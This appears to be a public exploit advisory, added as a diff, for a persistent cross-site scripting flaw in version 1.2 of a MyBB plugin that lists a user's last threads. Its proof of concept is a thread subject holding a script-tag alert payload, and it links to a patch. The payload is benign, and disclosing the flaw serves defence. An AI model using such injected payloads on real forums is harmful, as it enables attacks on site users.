@@ -1,0 +1,23 @@
+# Exploit Title: MyBB Last User's Threads in Profile Plugin v1.2 - Persistent XSS
+# Date: 3/19/2018
+# Author: 0xB9
+# Contact: luxorforums.com/User-0xB9 or 0xB9[at]protonmail.com
+# Software Link: https://community.mybb.com/mods.php?action=view&pid=910
+# Version: v1.2
+# Tested on: Ubuntu 17.10
+
+
+1. Description:
+Display last threads in user profile.
+ 
+
+2. Proof of Concept:
+
+Persistent XSS
+- Create a thread with the following subject <p """><SCRIPT>alert("XSS")</SCRIPT>">
+- Now visit your profile to see the alert.
+
+
+3. Solution:
+
+Patch: https://github.com/vintagedaddyo/MyBB_Plugin_Last-User-s-Threads-in-Profile/commit/5e3b81450d0bf7935885db2622f1a42e5961258d
